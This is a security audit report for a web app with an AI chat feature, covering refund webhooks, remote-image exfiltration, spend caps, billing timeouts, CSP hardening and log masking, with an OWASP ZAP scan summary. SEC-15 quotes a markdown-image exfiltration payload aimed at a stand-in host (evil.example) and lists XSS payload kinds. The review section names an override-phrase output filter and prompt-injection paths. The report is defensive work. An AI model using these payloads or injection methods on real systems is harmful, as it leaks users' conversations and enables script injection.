# Part 2B (branch `security/audit-fixes-b`)

## SEC-14 — Low — Refunded Lemon orders kept their credits silently

* **Where:** `services/auth-billing-service/src/services/webhook.service.ts`; database (new migration 013).
* **Weakness:** only `order_created` was handled. After Lemon refunded an order (full or partial — e.g. a buyer
  asking for a refund after spending the credits) nothing recorded it and nothing reported it, so the owner could
  not notice a buy → spend → refund pattern.
* **Repro:** `tests/api/webhook.refunds.test.ts` — a signed `order_refunded` for a credited order was answered 200
  and dropped (`ignored_event_type`): nothing stored, nothing listed.
* **Lemon facts used (official docs, not guessed):** `order_refunded` "A full or partial refund is issued on an
  order", payload = the Order object (`status` `refunded` / `partial_refund`, `refunded` = fully refunded,
  `refunded_amount` / `refunded_amount_usd` in cents, `refunded_at`, `test_mode`, `store_id`). No dispute or
  chargeback event exists in Lemon's event list; their refunds/chargebacks page says Lemon handles chargebacks and
  "in most cases" refunds on the store's behalf, but does not say whether that emits `order_refunded`. The webhook
  meta has no event id.
* **Fix (owner decision: no automatic claw-back):** the webhook verifies the signature exactly as for
  `order_created`, applies the same origin gate (store id; test mode in production, SEC-13), validates status and
  amount, and inserts one row per refund state into `lemon_order_refunds` (unique on order id + status + refunded
  amount: retries and replays are no-ops, a later larger partial refund is a new row). It never touches the ledger
  or balances. `refunded_orders_to_review()` (read-only, pinned `search_path`) lists unreviewed refunded orders
  whose `CREDIT_PURCHASE` is in the ledger; `npm run db:reconcile` prints them as `refunded_order_credited` and
  exits 2 until the owner sets `reviewed_at` (runbook §9). The app role may insert and read refunds, not mark
  them reviewed or delete them. Logs carry order id, status, amount — not the buyer's email.
* **Tests:** `tests/api/webhook.refunds.test.ts` (13), `tests/db/cli.test.ts` (reconcile lists / clears),
  `tests/api/app-role.test.ts` (flow as the app role; review/delete refused), runbook rollback covers 013.
* **Behaviour change (Lemon / ops):** subscribe `order_refunded` in the Lemon dashboard (runbook §8);
  `db:reconcile` can now exit 2 for unreviewed refunds.
* **Open:** chargebacks without an `order_refunded` (undocumented) — check the Lemon dashboard's disputes in the
  weekly review.

## SEC-15 — Low — Remote images in AI output were loaded automatically

* **Where:** `src/components/ai/ChatMessageContent.tsx` (assistant messages).
* **Weakness:** the renderer (react-markdown → remark-math → rehype-katex → rehype-sanitize) allowed `img` with
  `https:` sources, so a model answer containing `![x](https://host/p.gif?q=…)` made every viewer's browser
  request that URL. Model output is attacker-influenced whenever the user pastes crafted text ("paste this prompt
  into the AI Lab"): the injected instruction can make the model put the conversation into the URL — the classic
  markdown-image exfiltration channel — and it reveals the viewer's IP to the host. Low: the only data in reach is
  the user's own conversation, and the user has to paste the injection themselves.
* **Repro:** `tests/unit/ai/chat-output-rendering.test.tsx` — "markdown image to a third party": an `<img
  src="https://evil.example/p.gif?leak=chat">` was rendered.
* **Fix:** images in assistant output render as a link `[image: alt]` (http/https only, `target=_blank`,
  `rel="noopener noreferrer"`); nothing is fetched unless the user clicks. The CSP (frontend part of 2B) adds
  `img-src` as a second layer.
* **Verified inert (same test, 19 payloads):** raw `<script>`, `<img onerror>`, `<svg onload>`, `<iframe>`,
  `<style>`, `<form>`, `javascript:` / `vbscript:` / `data:` links (inline, reference, autolink, entity-obfuscated),
  `javascript:` images, KaTeX `\href` / `\url` / `\htmlStyle` / `\htmlClass`, HTML inside code fences. Raw HTML
  is never parsed (no `rehype-raw`); sanitize runs last, so even KaTeX's output is sanitized. User messages are
  plain text.
* **Info (owner decision, not changed):** because sanitize runs after KaTeX with the default schema, KaTeX's
  classes and MathML are stripped and maths in answers renders as garbled plain text. Making it render needs either
  sanitize-before-KaTeX (KaTeX's own output then becomes trusted; `trust` stays off) or a schema that allows
  KaTeX's classes, inline `style` and MathML. Both widen what model output can produce — a deliberate choice.

## SEC-16 — Medium — AI Lab spend had no ceiling

* **Where:** `src/app/api/chat/route.ts` (BFF), `services/auth-billing-service/src/services/aiCredits.service.ts`.
* **Weakness:** a turn costs one credit, but nothing bounded what a turn or a day costs us. Every verified account
  gets free credits (sign-up bonus), sign-ups are limited only per IP; a turn could send 24 × 8 000 characters of
  client-chosen history (~48 k tokens) and receive an answer of the model's maximum length (`maxOutputTokens`
  unset); there was no per-user or service-wide daily cap — the only limits were 10 turns/min/user (Upstash when
  configured, plus an in-memory per-instance limit). A farm of free accounts, or one compromised paying account,
  turns directly into model spend with no circuit breaker.
* **Repro:** `services/auth-billing-service/tests/api/ai-daily-caps.test.ts` (no cap: the 4th / 9th turn of a user
  was reserved, the global budget never refused) and `tests/api/chat.limits.test.ts` (`maxOutputTokens`
  absent from the model call; a 24 × 7 900-character history forwarded whole).
* **Fix:**
  * Express, at reservation time under the user's advisory lock: `AI_DAILY_TURNS_PER_USER` (default 200 per rolling
    24 h) → `429 AI_DAILY_LIMIT` with `limit` and `retryAfter` (when the oldest turn leaves the window);
    `AI_DAILY_TURNS_GLOBAL` (default 3 000) → `503 AI_CAPACITY_REACHED`, logged as an error. Every reservation counts
    (released/expired turns still called the model). Database-backed, so the caps hold across instances; the
    per-user count is serialised (concurrent turns cannot overshoot, tested with 8 parallel requests), the global one
    is a soft breaker (may overshoot by the in-flight count). Invalid or non-positive values fall back to the
    defaults — a typo cannot switch a cap off. Migration `014` adds the two indexes for the counts.
  * BFF: `maxOutputTokens` = `GEMINI_MAX_OUTPUT_TOKENS` (default 2 048); the conversation sent to the model is the
    newest turns that fit 32 000 characters (the user's question always included); `AI_DAILY_LIMIT` → `429` with
    `Retry-After`, `AI_CAPACITY_REACHED` → `503`; in both cases nothing is reserved and the model is not called.
* **Behaviour change (frontend / env):** new answers `429 {error:"AI_DAILY_LIMIT", retryAfter}` and
  `503 {error:"AI_CAPACITY_REACHED"}` from `/api/chat` (the UI shows them like other error codes); long
  conversations lose their oldest turns from the model's context; answers longer than ~2 048 tokens are cut by the
  model. New optional env: `AI_DAILY_TURNS_PER_USER`, `AI_DAILY_TURNS_GLOBAL` (Express), `GEMINI_MAX_OUTPUT_TOKENS`
  (Next). Pick the global cap from your budget: worst case ≈ cap × (32 k chars in + 2 048 tokens out) per day.

## SEC-17 — Low — BFF → billing calls without a timeout

* **Where:** `src/lib/billing/server-billing.ts` (`callInternal`: reserve, capture, release).
* **Weakness:** the internal `fetch` had no deadline. A billing service (or a proxy in front of it) that accepts
  the connection but does not answer — a stuck database lock, an overloaded instance — held each AI request for
  undici's default (~300 s) per attempt, up to four attempts for a capture: browsers hang, BFF connections pile up,
  and a capture that lands after the hold's TTL (600 s) is refused, so a delivered answer goes uncharged.
* **Repro:** `tests/api/chat.billing-timeout.test.ts` — with a billing stand-in that never answers `/consume`,
  the chat request was still pending after 20 s; a capture that hung once was never retried.
* **Fix:** every internal call (and its body read) is bounded by `BILLING_CALL_TIMEOUT_MS` (default 10 s); a
  timeout is handled like an unreachable service: a reservation → `503 BILLING_UNAVAILABLE` without calling the
  model; a capture / release → retried (both idempotent — a capture that did land is answered `alreadyProcessed`),
  tested to charge exactly once. `npm run check:config` now counts the capture attempts' timeouts in the longest
  turn (defaults: 30 s + 4.25 s + 4 × 10 s = 74.25 s, TTL must be ≥ 2× that).
* **Behaviour change (env):** optional `BILLING_CALL_TIMEOUT_MS` (Next).

## SEC-18 — Low — Content-Security-Policy did not restrict script execution

* **Where:** `next.config.ts` (static headers), `src/middleware.ts` (now `src/proxy.ts`), `src/app/layout.tsx`.
* **Weakness:** the CSP had `script-src 'self' 'unsafe-inline' https://accounts.google.com`: any injected inline
  script or event handler would run, so it gave no XSS protection. `img-src https:` allowed every host (the SEC-15
  channel), `connect-src` still listed the drei HDRI CDNs removed by FINDING-31, and `frame-ancestors`,
  `form-action`, `upgrade-insecure-requests` and HSTS were absent (only `X-Frame-Options`). Next sent
  `X-Powered-By: Next.js`. Low: no XSS sink was found (React escaping, the sanitised markdown renderer — SEC-15);
  this is the second layer.
* **Repro:** `tests/e2e/security-headers.spec.mts` and `tests/api/csp.test.ts` against the old headers: script-src
  contained `'unsafe-inline'`, `frame-ancestors` missing, `img-src` contained `https:`.
* **Fix (owner decision: strict nonce CSP, pages rendered per request):** `src/proxy.ts` (Next 16's rename of
  `middleware.ts`; the page gating is unchanged) sets a fresh 128-bit nonce per page request and
  `script-src 'self' 'nonce-…' 'strict-dynamic'` (`'unsafe-eval'` only under `next dev`), `frame-ancestors 'none'`,
  `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `default-src 'self'`, purpose-listed third parties
  (Google Identity Services per Google's documented values — `gsi/style`, `gsi/` frames and endpoints; PubChem and
  Wikipedia for the structure/element data; `upload.wikimedia.org` images), `worker-src 'self' blob:` and
  `upgrade-insecure-requests` in production behind https. Next applies the nonce to its own scripts; the root layout
  puts it on the theme script, which also makes every page dynamic (a nonce CSP requires it). API routes get a static
  `default-src 'self'; frame-ancestors 'none'; form-action 'none'` policy. `next.config.ts`: HSTS
  (`max-age=63072000; includeSubDomains`, production only, no `preload`), `Cross-Origin-Opener-Policy:
  same-origin-allow-popups` (Google's guidance for sign-in popups), Permissions-Policy adds `payment=()`, `usb=()`,
  `poweredByHeader: false`.
* **Verified in the browser (dev and production builds):** every served `<script>` carries the response's nonce,
  nonces differ per request; injected markup cannot run script (inline `<script>` in an injected `srcdoc`
  iframe, `onerror` handler, `javascript:` link — all blocked with a `script-src` violation); all public pages
  including the three 3D scenes, and the signed-in dashboard / AI Lab / profile, render with **zero** CSP
  violations and no page errors; the whole E2E suite passes under the policy (48/48 production, 46+1 skipped dev).
* **Trust model, stated:** `'strict-dynamic'` trusts scripts that already-trusted code creates (that is how the
  Google Identity script loads); styles keep `'unsafe-inline'` (React / framer-motion / R3F set style attributes;
  CSS injection is not script execution).
* **Follow-up from the ZAP baseline (reproduced, fixed in the same finding):** the first matcher skipped every path
  containing a dot, so the HTML 404 page for e.g. `/robots.txt` or `/anything.php` was served without a CSP. The proxy
  now covers every HTML response and skips only API routes, build assets and `hdri/` (tests: matcher unit test and
  "404 pages … carry the CSP too" in the E2E spec).
* **Not verifiable offline:** the live Google sign-in (Google's hosts are blocked in E2E). The policy follows
  Google's documented values; confirm a real Google sign-in on staging. Escape hatch: `CSP_MODE=report-only` (Next
  then sends `Content-Security-Policy-Report-Only`; nonces keep working).
* **Behaviour change (hosting / env):** all pages are server-rendered per request (no static/CDN caching of HTML;
  `_next/static` assets are unchanged). New optional env `CSP_MODE` (Next). Browsers remember HSTS for two years
  once the site is served over https.

## SEC-19 — Low — Full email addresses in production logs

* **Where:** `services/auth-billing-service/src/services/webhook.service.ts`, `src/lib/email.ts`.
* **Weakness:** "Processing user" (every purchase), "Purchase receipt sent", "No user matches the order email" and
  "Missing user identity" logged the buyer's full address; the Resend error path logged Resend's raw response body.
  Logs are retained and shipped to third parties far more widely than the database — personal data there is harder
  to delete and to protect.
* **Repro:** `services/auth-billing-service/tests/api/log-hygiene.test.ts` — a purchase matched by email and an
  unmatched order email: the full address appeared in the captured production log lines.
* **Fix:** `maskEmail()` (`a***@example.com`: enough to correlate a support request) at all four sites; the Resend
  error body is cut to 200 characters with addresses replaced.
* **Reviewed, no change:** no log line carries a password, session token, internal key, reset/verification token or
  link in production — the dev-only mail stand-in that prints whole mails is refused in production (SEC-08);
  rate-limit, auth and chat logs carry user ids, not addresses. `.env.example` files contain placeholders only
  (the two `replace-with-…` secrets are on both services' placeholder deny-lists; the local Docker password is the
  dev compose value). Error bodies: Express answers generic messages without stacks (FINDING-12, SEC-08), the BFF's
  error bodies are tested free of stack traces and paths (SEC-08 E2E).

## Dynamic scan — OWASP ZAP baseline (Part 2B)

* **Tool:** official image `ghcr.io/zaproxy/zaproxy:stable` (ZAP's docs: "Docker" → about / baseline-scan), pulled
  once and pinned by digest `sha256:5ccfff9a411743ab2615136a2edd7416bec9ce41572fa94e935df38c14adb2b6` (ZAP 2.17.0).
  One-off `docker run --rm`, only mount: the repo's gitignored `test-results/zap/`. Image removed afterwards
  (`docker rmi`); no other container or Docker setting touched.
* **Target:** only the local production-mode E2E stack (`next build` + `next start` on port 3100, Express on
  127.0.0.1:4100 behind it, Lemon/Gemini stubbed in-process), reached from the container as
  `http://host.docker.internal:3100` (Docker Desktop's name for this machine). Traditional spider only (2 min); the
  Ajax spider was not used because its browser would execute page JavaScript and contact Google/PubChem/Wikipedia
  from the container. `zap-baseline.py` is passive — no attack payloads.
* **Result:** 50 URLs, **0 FAIL**, 62 → 63 PASS, warnings below. Every warning was reproduced or explained before
  deciding:

| ZAP rule | Instances | Outcome |
| --- | --- | --- |
| 10038 CSP header not set | `/robots.txt`, `/sitemap.xml` | **Reproduced → fixed** (SEC-18 follow-up); gone on the re-scan |
| 10031 User-controllable HTML attribute | `/explore?molecule=…` | Not exploitable: probed with `x"><script>…<img onerror>`; the value only appears JSON-escaped (`\u003cscript\u003e`) inside Next's RSC payload, never as markup |
| 10055 CSP `style-src 'unsafe-inline'` | every page | Accepted, documented in SEC-18 (inline style attributes from React/framer-motion/R3F; not script execution) |
| 90004 COEP / COOP / CORP | pages, static chunks | Accepted: `require-corp` would break Wikipedia images and Google sign-in; COOP is deliberately `same-origin-allow-popups` (Google's guidance for sign-in popups), which ZAP reports as "invalid" |
| 10019 Content-Type missing | `/ai-lab`, `/dashboard`, `/profile` | Expected: the 307 redirects to `/login` for an anonymous client carry no body |
| 10049 Non-storable content | pages | Expected: pages are rendered per request (nonce CSP) |

* Raw reports (HTML / JSON / Markdown) stay local in `test-results/zap/` (gitignored), not committed.

## Part 2B — areas reviewed without a further finding

* **AI Lab — Gemini key:** read only in `src/app/api/chat/route.ts` (server); no `NEXT_PUBLIC_` variable carries a
  secret (the only ones are the Google client id and the Lemon variant ids, public by nature). The E2E test "client
  bundles carry no server secret" fetches every client chunk of every public page and finds none of `JWT_SECRET`,
  `INTERNAL_SERVICE_SECRET`, `GEMINI_API_KEY`; production serves no source maps (`.map` → 404).
* **AI Lab — 402 / 409 paths:** a reservation happens before the model is called, so neither path yields a free
  generation; the reference is server-generated (`randomUUID`), so a client cannot provoke or replay a 409; a 402
  reveals only the price of the operation. Both are behind the per-user rate limit and, now, the daily caps.
* **AI Lab — concurrency:** reservations serialise on the per-user advisory lock (FINDING-22 suites); the per-user
  daily cap is checked under the same lock (8 parallel requests → exactly the cap reserved, SEC-16 test).
* **AI Lab — content-policy heuristic (`validateAiOutput`):** four regexes over the *output* (e.g. "ignore previous
  instructions", "system prompt"). Trivially bypassed (paraphrase, spacing, another language), and it can misfire
  on an innocent answer that mentions a "system prompt"; a blocked answer is charged (422, deliberate since
  FINDING-03 so probing is not free). Bypassing it gains nothing beyond what the user could already obtain: there
  are no tools, no other users' data and no secrets in the prompt (the system prompt is not confidential), and the
  output is rendered inert (SEC-15) under the CSP. Treat it as a weak quality filter, not a security control; a
  moderation API / Gemini safety settings are the upgrade path (already a TODO in the code).
* **AI Lab — prompt injection:** the client sends the whole history, including "assistant" turns, so a user can
  forge context — only for their own session. Output side-effects are limited to rendering (inert) and the SMILES
  tag, which fetches `pubchem.ncbi.nlm.nih.gov/rest/pug/compound/smiles/<encoded>/SDF` (fixed host, path-encoded
  value; Info: the molecule string is sent to PubChem, a third party).
* **Frontend — XSS sinks:** `dangerouslySetInnerHTML` only for the theme pre-hydration script (constant input,
  tested to be a self-contained expression, now nonced); `innerHTML = ""` only to clear the Google button container;
  markdown only through `ChatMessageContent` (SEC-15 matrix); links in AI output are http(s) only with
  `rel="noopener noreferrer"`.
* **Frontend — browser storage:** no token anywhere (TC-27). `localStorage` keeps the theme, locale, onboarding
  flags and the signed-in profile (id, email, names, date of birth, flags) for instant UI; it is refreshed from the
  server on every load and cleared on logout and on a 401. Info: on a shared device the profile stays readable until
  the app next runs; dropping `dateOfBirth` from the cached copy is possible but risks the profile form initialising
  empty — not changed. `sessionStorage` holds only checkout intent / scroll position.
* **Third-party scripts:** only Google Identity Services, loaded on demand by `GoogleSignInButton` from
  `accounts.google.com/gsi/client` (Google publishes no SRI hash for it; it is trusted through `'strict-dynamic'`
  because our nonced code inserts it). No analytics, no CDN script.
* **Startup validation recap:** both services' production checks (SEC-08) plus `npm run check:config` for the pair
  (placeholders, values that must match, hold TTL vs the longest turn). Not checked at boot by design: `GEMINI_API_KEY`
  (the site still works without the AI Lab; `check:config` reports it).
* **Dev-only behaviour cannot reach production:** dev mail logging (refused under production rules, SEC-08), dev CORS
  (production gate, fail-closed), DB error details in responses and `/health` (only for exactly
  `NODE_ENV=development`), CSP `'unsafe-eval'` (only under `next dev`), `MOLECULESTUDIO_SKIP_DOTENV` (refused with
  `NODE_ENV=production`), Lemon test mode (SEC-13 gate).

